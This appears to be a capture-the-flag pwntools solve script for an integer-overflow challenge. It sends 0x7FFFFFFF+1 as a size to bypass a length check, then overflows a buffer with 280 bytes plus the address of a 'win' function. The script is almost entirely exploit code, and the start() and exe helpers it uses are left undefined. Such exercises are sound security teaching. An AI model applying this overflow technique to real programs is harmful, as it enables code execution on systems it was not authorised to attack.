"""
x64 integer overflow exploitation.

Category: Pwn > Integer Overflow

Description:
    Exploits integer overflow in size check to bypass buffer length validation.
    Sends MAX_INT+1 to wrap around and enable buffer overflow to win function.

Usage:
    python integer_overflow.py

Dependencies:
    - pwntools
"""
max_32_bit = 0x7FFFFFFF
max_64_bit = 0x7FFFFFFFFFFFFFFF

io = start()
io.sendlineafter(b'Size: ', str(max_32_bit + 0x1).encode())
io.sendlineafter(b'Data: ', b'A' * 280 + p64(exe.sym.win))
io.interactive()

